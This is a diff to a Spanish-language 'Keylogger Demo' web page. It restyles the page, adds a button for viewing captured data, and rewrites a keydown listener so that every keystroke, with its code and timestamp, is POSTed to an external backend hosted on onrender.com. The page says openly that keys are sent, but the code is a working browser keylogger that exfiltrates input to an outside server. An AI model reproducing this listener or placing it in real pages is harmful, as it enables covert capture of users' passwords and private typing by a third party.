@@ -3,32 +3,75 @@
 <head>
   <meta charset="UTF-8">
   <title>Keylogger Demo</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #f5f5f5;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .status {
+      padding: 10px;
+      margin: 20px 0;
+      border-radius: 5px;
+      text-align: center;
+    }
+    .status.active {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      margin: 5px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+  <script src="config.js"></script>
 </head>
 <body>
   <h1>Demo: Keylogger Web</h1>
   <p>Pulsa cualquier tecla y se enviará al backend.</p>
 
-  <button onclick="window.location.href='index.html'">Volver a Inicio</button>
+  <div style="margin: 20px 0;">
+    <button onclick="window.location.href='index.html'" style="margin: 5px; padding: 8px 12px;">🏠 Volver a Inicio</button>
+    <button onclick="window.open('https://backend-prueba-o523.onrender.com/ver-keylogger', '_blank')" style="margin: 5px; padding: 8px 12px;">📊 Ver Datos Capturados</button>
+  </div>
 
   <script>
     document.addEventListener('keydown', function(e) {
-      // Usar la URL actual del servidor (funciona tanto en local como en producción)
-      const baseUrl = window.location.origin;
-      
-      fetch(`${baseUrl}/captura`, {
+      // Usar la URL correcta del backend en Render
+      fetch('https://backend-prueba-o523.onrender.com/captura', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           key: e.key,
           code: e.code,
-          time: new Date().toISOString()
+          time: new Date().toISOString(),
+          source: 'netlify-frontend'
         })
       }).then(response => {
         if (response.ok) {
-          console.log('Tecla capturada:', e.key);
+          console.log('✅ Tecla capturada:', e.key);
+        } else {
+          console.error('❌ Error del servidor:', response.status);
         }
       }).catch(error => {
-        console.error('Error al enviar datos:', error);
+        console.error('❌ Error de conexión:', error);
       });
     });
   </script>
